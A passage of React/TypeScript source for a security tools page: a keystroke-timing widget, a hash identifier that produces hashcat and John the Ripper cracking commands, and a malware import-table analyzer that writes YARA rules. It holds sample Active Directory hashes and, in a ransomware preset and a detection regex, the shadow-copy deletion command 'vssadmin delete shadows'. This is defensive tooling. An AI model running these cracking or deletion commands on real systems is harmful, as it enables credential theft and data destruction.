              key={phrase}
              type="button"
              onClick={() => {
                setTargetPhrase(phrase);
                loadSimulatedTypingSample(phrase);
              }}
              className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs transition cursor-pointer ${
                targetPhrase === phrase
                  ? "border-accent bg-accent/10 text-accent"
                  : "border-border bg-background text-text-muted hover:text-text"
              }`}
            >
              {phrase}
            </button>
          ))}
        </div>
        <button
          type="button"
          onClick={clearRecording}
          className="rounded-xs border border-border bg-background px-2.5 py-1 font-heading text-[11px] font-semibold uppercase text-text-muted hover:border-accent hover:text-text cursor-pointer"
        >
          Clear &amp; Type Live
        </button>
      </div>

      {/* Live Typing Capture Box */}
      <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
        <div className="flex items-center justify-between">
          <label className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
            Live High-Precision Keystroke Capture Box (performance.now() DOM Listener)
          </label>
          <span className="font-mono-code text-[11px] text-text-muted">
            Target: &ldquo;{targetPhrase}&rdquo;
          </span>
        </div>
        <input
          type="text"
          value={typedText}
          onChange={(e) => setTypedText(e.target.value)}
          onKeyDown={handleKeyDown}
          onKeyUp={handleKeyUp}
          placeholder={`Click here, press "Clear & Type Live", and type: ${targetPhrase}`}
          className="w-full rounded-xs border border-border bg-surface px-3 py-2.5 font-mono-code text-sm text-text focus:border-accent focus:outline-none"
        />
      </div>

      {/* Metrics Summary */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <div className="rounded-xs border border-border bg-background p-3">
          <div className="text-[10px] font-heading uppercase text-text-muted">
            Mean Dwell Time (Hold)
          </div>
          <div className="mt-1 font-mono-code text-base font-bold text-text">
            {stats.avgDwell} ms
          </div>
          <div className="text-[11px] text-text-muted">keydown → keyup duration</div>
        </div>
        <div className="rounded-xs border border-border bg-background p-3">
          <div className="text-[10px] font-heading uppercase text-text-muted">
            Mean Flight Time (Seek)
          </div>
          <div className="mt-1 font-mono-code text-base font-bold text-accent">
            {stats.avgFlight} ms
          </div>
          <div className="text-[11px] text-text-muted">keyup(i) → keydown(i+1)</div>
        </div>
        <div className="rounded-xs border border-border bg-background p-3">
          <div className="text-[10px] font-heading uppercase text-text-muted">
            Cadence Speed
          </div>
          <div className="mt-1 font-mono-code text-base font-bold text-emerald-400">
            {stats.wpm} WPM
          </div>
          <div className="text-[11px] text-text-muted">Rollovers: {stats.rolloverCount}</div>
        </div>
        <div className="rounded-xs border border-border bg-background p-3">
          <div className="text-[10px] font-heading uppercase text-text-muted">
            Biometric Consistency
          </div>
          <div className="mt-1 font-mono-code text-base font-bold text-text">
            {stats.consistencyScore}/100
          </div>
          <div className="text-[11px] text-text-muted">Digraph behavioral profile</div>
        </div>
      </div>

      {/* SVG Keystroke Rhythm Barcode */}
      <div className="rounded-xs border border-border bg-background p-3.5">
        <div className="mb-2 flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Keystroke Dwell &amp; Flight Rhythm Barcode (SVG)
          </span>
          <span className="font-mono-code text-[11px] text-text-muted">
            Orange = Dwell Hold (ms) | Cyan = Inter-Key Flight Latency (ms)
          </span>
        </div>
        <svg viewBox="0 0 680 150" className="w-full h-36 bg-surface rounded-xs border border-border/60">
          {events.slice(0, 28).map((ev, i) => {
            const x = 16 + i * 23;
            const dwellH = Math.min(65, Math.max(8, ev.dwellMs * 0.55));
            const flightH = Math.min(65, Math.max(4, Math.abs(ev.flightMs) * 0.4));
            return (
              <g key={`${ev.index}-${i}`}>
                {/* Dwell Bar */}
                <rect
                  x={x}
                  y={75 - dwellH}
                  width="9"
                  height={dwellH}
                  fill="#ff6a00"
                  rx="1"
                />
                {/* Flight Bar */}
                <rect
                  x={x + 10}
                  y={75}
                  width="8"
                  height={flightH}
                  fill={ev.flightMs < 0 ? "#a855f7" : "#38bdf8"}
                  rx="1"
                />
                <text
                  x={x + 3}
                  y="142"
                  fill="#94a3b8"
                  fontSize="9"
                  fontFamily="monospace"
                >
                  {ev.key === "SPACE" ? "␣" : ev.key.slice(0, 1)}
                </text>
              </g>
            );
          })}
          <line x1="10" y1="75" x2="670" y2="75" stroke="#475569" strokeWidth="1" />
        </svg>
        <p className="mt-2 text-xs text-text-muted">
          <strong>Acoustic &amp; Timing Side-Channel Note:</strong> Even when packet payloads are encrypted (SSH interactive mode) or captured via microphone audio, physical QWERTY distance creates deterministic flight times (e.g. same-finger bigrams take ~140ms vs alternating-hand bigrams at ~60ms), enabling Hidden Markov Models (HMM) to narrow password candidates by 70%+.
        </p>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 3. HASHCAT & JOHN THE RIPPER HASH TYPE IDENTIFIER
 *    Slug: hashcat-john-hash-type-identifier
 * ========================================================================== */
interface HashCandidateMatch {
  name: string;
  confidence: number;
  hashcatMode: string;
  johnFormat: string;
  rtx5090Speed: string;
  securityVerdict: "Strong KDF" | "Moderate / Salted" | "Weak / Unsalted Fast Hash";
  notes: string;
}

const HASH_PRESETS: { label: string; value: string }[] = [
  {
    label: "bcrypt $2y$12$...",
    value: "$2y$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW",
  },
  {
    label: "Argon2id $argon2id$...",
    value: "$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQxMjM0NTY$RdescudvJCsgt3ub+b+dWRWJTmaaJObG",
  },
  {
    label: "Kerberoast $krb5tgs$23$...",
    value: "$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$8f4a9b2c1d3e5f60718293a4b5c6d7e8$0123456789abcdef0123456789abcdef0123456789abcdef",
  },
  {
    label: "AS-REP $krb5asrep$23$...",
    value: "$krb5asrep$23$legacy_user@CORP.LOCAL:a1b2c3d4e5f60718293a4b5c6d7e8f90$99887766554433221100ffeeddccbbaa9988776655443322",
  },
  {
    label: "NetNTLMv2",
    value: "admin::CORP:1122334455667788:8846F7EAEE8FB117AD06BDD830B7586C:01010000000000000090837465123456",
  },
  {
    label: "Linux SHA-512 $6$...",
    value: "$6$rounds=5000$saltsalt1234$W2K8z1n9Q0p4L7m2X5v8B1n4M7q0W3e6R9t2Y5u8I1o4P7a0S3d6F9g2H5j8K1l4Z7x0C3v6B9n2M5q8W1e4R/",
  },
  {
    label: "WordPress phpass $P$...",
    value: "$P$B55D6LjfHDkINU5wF.v2BuHvO/416ec",
  },
  {
    label: "NTLM / MD5 32-hex",
    value: "8846f7eaee8fb117ad06bdd830b7586c",
  },
];

function identifyHashString(raw: string): HashCandidateMatch[] {
  const h = raw.trim();
  if (!h) return [];

  if (h.startsWith("$2a$") || h.startsWith("$2b$") || h.startsWith("$2y$")) {
    return [
      {
        name: "bcrypt (Blowfish Adaptive KDF)",
        confidence: 99,
        hashcatMode: "3200",
        johnFormat: "bcrypt",
        rtx5090Speed: "~215,000 H/s (at cost=10) / ~53,000 H/s (at cost=12)",
        securityVerdict: "Strong KDF",
        notes: "Contains 128-bit Base64 salt and exponential work factor (2^cost rounds).",
      },
    ];
  }
  if (h.startsWith("$argon2id$") || h.startsWith("$argon2i$") || h.startsWith("$argon2d$")) {
    return [
      {
        name: "Argon2id / Argon2i Memory-Hard KDF",
        confidence: 99,
        hashcatMode: "34000 (Argon2)",
        johnFormat: "argon2",
        rtx5090Speed: "~1,800 H/s (at m=64MB, t=3)",
        securityVerdict: "Strong KDF",
        notes: "OWASP #1 recommended password hashing algorithm; resists GPU/ASIC parallelism via memory lanes.",
      },
    ];
  }
  if (h.startsWith("$krb5tgs$23$")) {
    return [
      {
        name: "Kerberos 5 TGS-REP etype 23 (Kerberoasting RC4-HMAC)",
        confidence: 99,
        hashcatMode: "13100",
        johnFormat: "krb5tgs",
        rtx5090Speed: "~3.4 GH/s",
        securityVerdict: "Weak / Unsalted Fast Hash",
        notes: "Active Directory SPN ticket encrypted with service account NTLM hash (RC4). Upgrade SPNs to AES256 (etype 18) and use 25+ char gMSA passwords.",
      },
    ];
  }
  if (h.startsWith("$krb5asrep$23$")) {
    return [
      {
        name: "Kerberos 5 AS-REP etype 23 (AS-REP Roasting)",
        confidence: 99,
        hashcatMode: "18200",
        johnFormat: "krb5asrep",
        rtx5090Speed: "~2.9 GH/s",
        securityVerdict: "Weak / Unsalted Fast Hash",
        notes: "Account has 'Do not require Kerberos preauthentication' enabled in Active Directory.",
      },
    ];
  }
  if (/^[^:]+::[^:]*:[a-fA-F0-9]{16}:[a-fA-F0-9]{32}:[a-fA-F0-9]+$/.test(h)) {
    return [
      {
        name: "NetNTLMv2 (NTLMv2 Challenge-Response)",
        confidence: 98,
        hashcatMode: "5600",
        johnFormat: "netntlmv2",
        rtx5090Speed: "~14.2 GH/s",
        securityVerdict: "Moderate / Salted",
        notes: "Captured via Responder/SMB relay on local network. Cannot be passed directly in Pass-the-Hash, but crackable offline.",
      },
    ];
  }
  if (h.startsWith("$6$")) {
    return [
      {
        name: "sha512crypt (Linux /etc/shadow $6$)",
        confidence: 99,
        hashcatMode: "1800",
        johnFormat: "sha512crypt",
        rtx5090Speed: "~680,000 H/s (default 5000 rounds)",
        securityVerdict: "Moderate / Salted",
        notes: "Standard glibc SHA-512 crypt; modern distros migrate to yescrypt ($y$).",
      },
    ];
  }
  if (h.startsWith("$P$") || h.startsWith("$H$")) {
    return [
      {
        name: "phpass (WordPress / phpBB / Drupal MD5-Crypt Variant)",
        confidence: 98,
        hashcatMode: "400",
        johnFormat: "phpass",
        rtx5090Speed: "~48.5 MH/s",
        securityVerdict: "Moderate / Salted",
        notes: "Legacy iterated MD5 password hash used in WordPress (< 6.8) and phpBB.",
      },
    ];
  }
  if (/^[a-fA-F0-9]{32}$/.test(h)) {
    return [
      {
        name: "Windows NTLM (MD4 of UTF-16LE)",
        confidence: 90,
        hashcatMode: "1000",
        johnFormat: "nt",
        rtx5090Speed: "~295.0 GH/s",
        securityVerdict: "Weak / Unsalted Fast Hash",
        notes: "Unsalted 128-bit hash stored in Windows SAM / NTDS.dit. Vulnerable to instant Pass-the-Hash and high-speed GPU cracking.",
      },
      {
        name: "Raw MD5",
        confidence: 88,
        hashcatMode: "0",
        johnFormat: "raw-md5",
        rtx5090Speed: "~165.0 GH/s",
        securityVerdict: "Weak / Unsalted Fast Hash",
        notes: "128-bit legacy cryptographic digest; zero salt protection.",
      },
    ];
  }
  if (/^[a-fA-F0-9]{40}$/.test(h)) {
    return [
      {
        name: "Raw SHA-1",
        confidence: 92,
        hashcatMode: "100",
        johnFormat: "raw-sha1",
        rtx5090Speed: "~54.0 GH/s",
        securityVerdict: "Weak / Unsalted Fast Hash",
        notes: "160-bit hex digest.",
      },
    ];
  }
  if (/^[a-fA-F0-9]{64}$/.test(h)) {
    return [
      {
        name: "Raw SHA-256",
        confidence: 94,
        hashcatMode: "1400",
        johnFormat: "raw-sha256",
        rtx5090Speed: "~22.5 GH/s",
        securityVerdict: "Weak / Unsalted Fast Hash",
        notes: "256-bit hex digest (64 hex characters).",
      },
    ];
  }

  return [
    {
      name: "Custom / Unknown Modular Crypt or Raw Digest",
      confidence: 45,
      hashcatMode: "Auto-detect (--identify)",
      johnFormat: "--format=auto",
      rtx5090Speed: "Varies by KDF",
      securityVerdict: "Moderate / Salted",
      notes: `Length: ${h.length} chars. Run 'hashcat --identify hash.txt' for extended plugin modes.`,
    },
  ];
}

function HashcatJohnHashTypeIdentifier({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [hashInput, setHashInput] = useState(HASH_PRESETS[0].value);
  const [wordlistPath, setWordlistPath] = useState("/usr/share/wordlists/rockyou.txt");
  const [ruleFile, setRuleFile] = useState("best64.rule");

  useEffect(() => {
    setHashInput(HASH_PRESETS[0].value);
    setWordlistPath("/usr/share/wordlists/rockyou.txt");
    setRuleFile("best64.rule");
  }, [resetTrigger]);

  const candidates = useMemo(() => identifyHashString(hashInput), [hashInput]);
  const primary = candidates[0];

  const hashcatCmd = primary
    ? `hashcat -m ${primary.hashcatMode.split(" ")[0]} -a 0 hashes.txt ${wordlistPath} -r rules/${ruleFile} -w 3 -O`
    : "";
  const johnCmd = primary
    ? `john --format=${primary.johnFormat} --wordlist=${wordlistPath} --rules=Best64 hashes.txt`
    : "";

  useEffect(() => {
    if (!primary) return;
    setOutput(
      [
        `=== HASHCAT & JOHN THE RIPPER HASH ANALYSIS ===`,
        `Input Hash: ${hashInput.trim()}`,
        `Length: ${hashInput.trim().length} chars`,
        `Primary Match: ${primary.name} (${primary.confidence}% confidence)`,
        `Hashcat Mode (-m): ${primary.hashcatMode}`,
        `John Format (--format): ${primary.johnFormat}`,
        `RTX 5090 Benchmark Speed: ${primary.rtx5090Speed}`,
        `Security Verdict: ${primary.securityVerdict}`,
        ``,
        `# Hashcat Command:`,
        hashcatCmd,
        ``,
        `# John the Ripper Command:`,
        johnCmd,
      ].join("\n")
    );
  }, [hashInput, primary, hashcatCmd, johnCmd, setOutput]);

  return (
    <div className="space-y-4">
      {/* 8 One-Click Presets */}
      <div>
        <div className="mb-1.5 font-heading text-[11px] font-bold uppercase text-text-muted">
          One-Click Sample Hash Presets (8 Formats):
        </div>
        <div className="flex flex-wrap gap-1.5">
          {HASH_PRESETS.map((preset) => (
            <button
              key={preset.label}
              type="button"
              onClick={() => setHashInput(preset.value)}
              className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs transition cursor-pointer ${
                hashInput === preset.value
                  ? "border-accent bg-accent/10 text-accent"
                  : "border-border bg-background text-text-muted hover:text-text"
              }`}
            >
              {preset.label}
            </button>
          ))}
        </div>
      </div>

      {/* Hash Input */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div className="md:col-span-2">
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Paste Target Hash String
          </label>
          <input
            type="text"
            value={hashInput}
            onChange={(e) => setHashInput(e.target.value)}
            placeholder="Paste bcrypt, Argon2id, Kerberoast, NetNTLMv2, SHA-512, or NTLM hash..."
            className="mt-1 w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
          />
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
            Wordlist Path
          </label>
          <input
            type="text"
            value={wordlistPath}
            onChange={(e) => setWordlistPath(e.target.value)}
            className="mt-1 w-full rounded-xs border border-border bg-background px-2.5 py-2 font-mono-code text-xs text-text"
          />
        </div>
      </div>

      {/* Candidate Results */}
      <div className="space-y-2.5">
        {candidates.map((cand) => (
          <div
            key={cand.name}
            className="rounded-xs border border-border bg-background p-3.5 space-y-2"
          >
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                <Hash className="h-4 w-4 text-accent" />
                <span className="font-heading text-sm font-bold text-text">{cand.name}</span>
                <span className="rounded-xs bg-accent/15 px-2 py-0.5 font-mono-code text-[11px] font-bold text-accent">
                  {cand.confidence}% Match
                </span>
              </div>
              <span
                className={`rounded-xs px-2 py-0.5 font-mono-code text-[11px] font-bold ${
                  cand.securityVerdict === "Strong KDF"
                    ? "bg-emerald-500/15 text-emerald-400"
                    : cand.securityVerdict === "Moderate / Salted"
                    ? "bg-amber-500/15 text-amber-400"
                    : "bg-rose-500/15 text-rose-400"
                }`}
              >
                {cand.securityVerdict}
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 pt-1 font-mono-code text-xs">
              <div className="rounded-xs bg-surface p-2">
                <span className="text-text-muted block text-[10px]">Hashcat Mode (-m)</span>
                <span className="font-bold text-text">-m {cand.hashcatMode}</span>
              </div>
              <div className="rounded-xs bg-surface p-2">
                <span className="text-text-muted block text-[10px]">John the Ripper</span>
                <span className="font-bold text-text">--format={cand.johnFormat}</span>
              </div>
              <div className="rounded-xs bg-surface p-2">
                <span className="text-text-muted block text-[10px]">RTX 5090 Crack Rate</span>
                <span className="font-bold text-emerald-400">{cand.rtx5090Speed}</span>
              </div>
            </div>
            <p className="text-xs text-text-muted">{cand.notes}</p>
          </div>
        ))}
      </div>

      {/* Copy-Ready CLI Commands */}
      {primary && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
          <div className="rounded-xs border border-border bg-background p-3">
            <div className="flex items-center justify-between mb-1.5">
              <span className="font-heading text-[11px] font-bold uppercase text-accent">
                Hashcat Dictionary + Rule CLI
              </span>
              <InlineCopyButton text={hashcatCmd} />
            </div>
            <pre className="overflow-x-auto rounded-xs bg-surface p-2.5 font-mono-code text-xs text-text">
              {hashcatCmd}
            </pre>
          </div>
          <div className="rounded-xs border border-border bg-background p-3">
            <div className="flex items-center justify-between mb-1.5">
              <span className="font-heading text-[11px] font-bold uppercase text-accent">
                John the Ripper CLI
              </span>
              <InlineCopyButton text={johnCmd} />
            </div>
            <pre className="overflow-x-auto rounded-xs bg-surface p-2.5 font-mono-code text-xs text-text">
              {johnCmd}
            </pre>
          </div>
        </div>
      )}

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 4. MALWARE WINDOWS API & PE IMPORT ADDRESS TABLE (IAT) THREAT ANALYZER
 *    Slug: malware-windows-api-iat-threat-analyzer
 * ========================================================================== */
interface WinApiSignature {
  api: string;
  dll: string;
  mitreId: string;
  mitreCategory: string;
  severityWeight: number;
  purpose: string;
}

const WIN_API_CATALOG: WinApiSignature[] = [
  // Process Injection (T1055)
  { api: "VirtualAllocEx", dll: "KERNEL32.dll", mitreId: "T1055", mitreCategory: "Process Injection", severityWeight: 18, purpose: "Allocates executable memory inside a remote process virtual address space." },
  { api: "WriteProcessMemory", dll: "KERNEL32.dll", mitreId: "T1055", mitreCategory: "Process Injection", severityWeight: 18, purpose: "Writes shellcode or PE sections into remote process memory." },
  { api: "CreateRemoteThread", dll: "KERNEL32.dll", mitreId: "T1055", mitreCategory: "Process Injection", severityWeight: 20, purpose: "Spawns execution thread inside remote target process." },
  { api: "NtUnmapViewOfSection", dll: "ntdll.dll", mitreId: "T1055.012", mitreCategory: "Process Hollowing", severityWeight: 22, purpose: "Unmaps legitimate image section in suspended process for Process Hollowing." },
  { api: "QueueUserAPC", dll: "KERNEL32.dll", mitreId: "T1055.004", mitreCategory: "APC Injection", severityWeight: 16, purpose: "Queues Asynchronous Procedure Call to hijacked thread (Early Bird APC)." },
  { api: "VirtualProtectEx", dll: "KERNEL32.dll", mitreId: "T1055", mitreCategory: "Process Injection", severityWeight: 14, purpose: "Flips memory page permissions from RW to RX/RWX." },
  { api: "OpenProcess", dll: "KERNEL32.dll", mitreId: "T1055", mitreCategory: "Process Injection", severityWeight: 8, purpose: "Acquires PROCESS_ALL_ACCESS handle to target PID." },
  // Input & Screen Capture (T1056 / T1113)
  { api: "SetWindowsHookExA", dll: "USER32.dll", mitreId: "T1056.001", mitreCategory: "Input Capture / Keylogging", severityWeight: 18, purpose: "Installs global WH_KEYBOARD_LL low-level keystroke hook." },
  { api: "SetWindowsHookExW", dll: "USER32.dll", mitreId: "T1056.001", mitreCategory: "Input Capture / Keylogging", severityWeight: 18, purpose: "Installs Unicode global keyboard/mouse message hook." },
  { api: "GetAsyncKeyState", dll: "USER32.dll", mitreId: "T1056.001", mitreCategory: "Input Capture / Keylogging", severityWeight: 16, purpose: "Polls physical key press state in userland keylogger loop." },
  { api: "GetForegroundWindow", dll: "USER32.dll", mitreId: "T1056.001", mitreCategory: "Input Capture / Keylogging", severityWeight: 8, purpose: "Captures active window title to correlate stolen credentials." },
  { api: "BitBlt", dll: "GDI32.dll", mitreId: "T1113", mitreCategory: "Screen Capture", severityWeight: 10, purpose: "Copies desktop device context pixels for spyware screenshot capture." },
  { api: "GetDC", dll: "USER32.dll", mitreId: "T1113", mitreCategory: "Screen Capture", severityWeight: 6, purpose: "Retrieves display device context handle." },
  // Anti-Analysis & Debugger Evasion (T1622)
  { api: "IsDebuggerPresent", dll: "KERNEL32.dll", mitreId: "T1622", mitreCategory: "Debugger Evasion", severityWeight: 12, purpose: "Checks PEB.BeingDebugged flag to abort inside x64dbg/WinDbg." },
  { api: "CheckRemoteDebuggerPresent", dll: "KERNEL32.dll", mitreId: "T1622", mitreCategory: "Debugger Evasion", severityWeight: 14, purpose: "Queries kernel for attached debug port on process." },
  { api: "NtQueryInformationProcess", dll: "ntdll.dll", mitreId: "T1622", mitreCategory: "Debugger Evasion", severityWeight: 15, purpose: "Queries ProcessDebugPort / ProcessDebugFlags directly via native API." },
  { api: "OutputDebugStringA", dll: "KERNEL32.dll", mitreId: "T1622", mitreCategory: "Debugger Evasion", severityWeight: 7, purpose: "Probes debugger attachment via last-error behavior." },
  { api: "GetTickCount", dll: "KERNEL32.dll", mitreId: "T1497.003", mitreCategory: "Time-Based Sandbox Evasion", severityWeight: 6, purpose: "Measures elapsed ticks to detect sandbox sleep acceleration or single-stepping." },
  // Ransomware & Crypto Impact (T1486 / T1490)
  { api: "CryptAcquireContextA", dll: "ADVAPI32.dll", mitreId: "T1486", mitreCategory: "Data Encrypted for Impact", severityWeight: 14, purpose: "Initializes Windows CryptoAPI CSP for payload or file encryption." },
  { api: "CryptAcquireContextW", dll: "ADVAPI32.dll", mitreId: "T1486", mitreCategory: "Data Encrypted for Impact", severityWeight: 14, purpose: "Initializes CryptoAPI key container." },
  { api: "CryptEncrypt", dll: "ADVAPI32.dll", mitreId: "T1486", mitreCategory: "Data Encrypted for Impact", severityWeight: 16, purpose: "Encrypts buffer in-place (frequently paired with FindFirstFileW)." },
  { api: "CryptGenKey", dll: "ADVAPI32.dll", mitreId: "T1486", mitreCategory: "Data Encrypted for Impact", severityWeight: 14, purpose: "Generates symmetric AES/ChaCha or RSA key material." },
  { api: "BCryptEncrypt", dll: "bcrypt.dll", mitreId: "T1486", mitreCategory: "Data Encrypted for Impact", severityWeight: 15, purpose: "CNG next-gen encryption primitive used by modern ransomware." },
  { api: "FindFirstFileW", dll: "KERNEL32.dll", mitreId: "T1083", mitreCategory: "File & Directory Discovery", severityWeight: 6, purpose: "Enumerates filesystem directories for target extensions." },
  { api: "FindNextFileW", dll: "KERNEL32.dll", mitreId: "T1083", mitreCategory: "File & Directory Discovery", severityWeight: 6, purpose: "Iterates directory entries during encryption or exfiltration." },
  { api: "DeleteFileW", dll: "KERNEL32.dll", mitreId: "T1070.004", mitreCategory: "File Deletion", severityWeight: 8, purpose: "Deletes original plaintext files or self-deletes dropper." },
  // C2 & Network (T1071)
  { api: "InternetOpenA", dll: "WININET.dll", mitreId: "T1071.001", mitreCategory: "C2 Web Traffic", severityWeight: 10, purpose: "Initializes WinINet HTTP/HTTPS client with custom User-Agent." },
  { api: "InternetOpenUrlA", dll: "WININET.dll", mitreId: "T1071.001", mitreCategory: "C2 Web Traffic", severityWeight: 12, purpose: "Fetches second-stage payload or C2 tasking from URL." },
  { api: "URLDownloadToFileA", dll: "urlmon.dll", mitreId: "T1105", mitreCategory: "Ingress Tool Transfer", severityWeight: 16, purpose: "Downloads remote executable directly to disk." },
  { api: "WSAStartup", dll: "WS2_32.dll", mitreId: "T1095", mitreCategory: "Raw Socket C2", severityWeight: 8, purpose: "Initializes Winsock raw TCP/UDP socket stack." },
  // Persistence & Privilege Escalation (T1547 / T1543 / T1134)
  { api: "RegSetValueExA", dll: "ADVAPI32.dll", mitreId: "T1547.001", mitreCategory: "Registry Run Persistence", severityWeight: 12, purpose: "Writes CurrentVersion\\Run registry value for boot persistence." },
  { api: "CreateServiceA", dll: "ADVAPI32.dll", mitreId: "T1543.003", mitreCategory: "Windows Service Persistence", severityWeight: 15, purpose: "Registers persistent Windows background service." },
  { api: "AdjustTokenPrivileges", dll: "ADVAPI32.dll", mitreId: "T1134", mitreCategory: "Access Token Manipulation", severityWeight: 14, purpose: "Enables SeDebugPrivilege on process token." },
  { api: "ShellExecuteA", dll: "SHELL32.dll", mitreId: "T1106", mitreCategory: "Native Execution", severityWeight: 8, purpose: "Spawns child process or executes system command." },
  { api: "WinExec", dll: "KERNEL32.dll", mitreId: "T1106", mitreCategory: "Native Execution", severityWeight: 10, purpose: "Executes command line string." },
];

const IAT_PRESETS: { label: string; dump: string }[] = [
  {
    label: "Process Hollowing & Injection Stub",
    dump: `Dump of file loader_stub.exe (PE32+ executable x86-64)
Import Address Table (IAT):
  KERNEL32.dll:
    CreateProcessA
    OpenProcess
    VirtualAllocEx
    WriteProcessMemory
    VirtualProtectEx
    CreateRemoteThread
    IsDebuggerPresent
    CheckRemoteDebuggerPresent
  ntdll.dll:
    NtUnmapViewOfSection
    NtQueryInformationProcess`,
  },
  {
    label: "Userland Keylogger & Screen Capture",
    dump: `Dump of file win_monitor_svc.exe
Import Address Table (IAT):
  USER32.dll:
    SetWindowsHookExA
    GetAsyncKeyState
    GetForegroundWindow
    GetDC
  GDI32.dll:
    BitBlt
  ADVAPI32.dll:
    RegSetValueExA
  WININET.dll:
    InternetOpenA
    InternetOpenUrlA`,
  },
  {
    label: "Crypto-Ransomware Locker",
    dump: `Dump of file lockbit_sample.bin
  ADVAPI32.dll:
    CryptAcquireContextW
    CryptGenKey
    CryptEncrypt
    AdjustTokenPrivileges
  bcrypt.dll:
    BCryptEncrypt
  KERNEL32.dll:
    FindFirstFileW
    FindNextFileW
    DeleteFileW
    WinExec
  strings: vssadmin.exe delete shadows /all /quiet`,
  },
  {
    label: "Benign Windows GUI Utility",
    dump: `Dump of file notepad_helper.exe
  USER32.dll:
    CreateWindowExW
    DefWindowProcW
    DispatchMessageW
    GetMessageW
  KERNEL32.dll:
    GetModuleHandleW
    GetTickCount
    ExitProcess`,
  },
];

function MalwareWindowsApiIatThreatAnalyzer({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [iatDump, setIatDump] = useState(IAT_PRESETS[0].dump);

  useEffect(() => {
    setIatDump(IAT_PRESETS[0].dump);
  }, [resetTrigger]);

  const analysis = useMemo(() => {
    const matched = WIN_API_CATALOG.filter((sig) =>
      new RegExp(`\\b${sig.api}\\b`, "i").test(iatDump)
    );
    const hasVssAdmin = /vssadmin.*delete\s+shadows/i.test(iatDump);
    const rawScore =
      matched.reduce((acc, m) => acc + m.severityWeight, 0) + (hasVssAdmin ? 25 : 0);
    const riskScore = Math.min(100, rawScore);

    const groupedByMitre: Record<string, WinApiSignature[]> = {};
    for (const m of matched) {
      const key = `${m.mitreId} — ${m.mitreCategory}`;
      if (!groupedByMitre[key]) groupedByMitre[key] = [];
      groupedByMitre[key].push(m);
    }

    const yaraApis = matched.slice(0, 6).map((m, i) => `    $api${i + 1} = "${m.api}" ascii wide`);
    const yaraRule = [
      `rule Suspicious_PE_IAT_Capabilities {`,
      `  meta:`,
      `    author = "Zero's Universe Threat Lab"`,
      `    risk_score = ${riskScore}`,
      `  strings:`,
      ...(yaraApis.length > 0 ? yaraApis : [`    $mz = "MZ"`]),
      `  condition:`,
      `    uint16(0) == 0x5A4D and ${Math.max(1, Math.min(3, yaraApis.length))} of ($api*)`,
      `}`,
    ].join("\n");

    return { matched, hasVssAdmin, riskScore, groupedByMitre, yaraRule };
  }, [iatDump]);

  useEffect(() => {
    const lines = [
      `=== MALWARE PE IAT & WINDOWS API CAPABILITY REPORT ===`,
      `Malware Capability Risk Score: ${analysis.riskScore}/100`,
      `Matched High-Risk Windows APIs: ${analysis.matched.length}`,
      analysis.hasVssAdmin ? `CRITICAL IOC: Volume Shadow Copy deletion command detected (T1490)!` : ``,
      ``,
      `=== MITRE ATT&CK CAPABILITY CLUSTERS ===`,
      ...Object.entries(analysis.groupedByMitre).map(
        ([cluster, sigs]) =>
          `[${cluster}]\n` +
          sigs.map((s) => `  - ${s.api} (${s.dll}): ${s.purpose}`).join("\n")
      ),
      ``,
      `=== GENERATED YARA HUNTING RULE ===`,
      analysis.yaraRule,
    ]
      .filter(Boolean)
      .join("\n");
    setOutput(lines);
  }, [analysis, setOutput]);

  return (
    <div className="space-y-4">
      {/* Presets */}
      <div className="flex flex-wrap items-center gap-1.5">
        <span className="font-heading text-[11px] font-bold uppercase text-text-muted mr-1">
          Sample PE IAT Presets:
        </span>
        {IAT_PRESETS.map((preset) => (
          <button
            key={preset.label}
            type="button"
            onClick={() => setIatDump(preset.dump)}
            className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs transition cursor-pointer ${
              iatDump === preset.dump
                ? "border-accent bg-accent/10 text-accent"
                : "border-border bg-background text-text-muted hover:text-text"
            }`}
          >
            {preset.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        <div className="lg:col-span-2">
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Paste PE Import Address Table (`objdump -p`, `dumpbin /imports`, or `strings` output)
          </label>
          <textarea
            rows={7}
            value={iatDump}
            onChange={(e) => setIatDump(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
          />
        </div>

        {/* Score Card */}
        <div className="rounded-xs border border-border bg-background p-4 flex flex-col justify-between">
          <div>
            <div className="text-[10px] font-heading uppercase text-text-muted">
              Malware Capability Risk Score
            </div>
            <div
              className={`mt-1 font-mono-code text-3xl font-bold ${
                analysis.riskScore >= 70
                  ? "text-rose-400"
                  : analysis.riskScore >= 35
                  ? "text-amber-400"
                  : "text-emerald-400"
              }`}
            >
              {analysis.riskScore} / 100
            </div>
            <div className="mt-1 text-xs font-semibold text-text">
              {analysis.riskScore >= 70
                ? "High-Confidence Offensive / Malicious Capabilities"
                : analysis.riskScore >= 35
                ? "Suspicious Dual-Use / Hook Capabilities"
                : "Low Risk / Standard Win32 GUI Imports"}
            </div>
          </div>

          <div className="mt-3 pt-3 border-t border-border text-xs font-mono-code space-y-1">
            <div>Flagged Imports: {analysis.matched.length}</div>
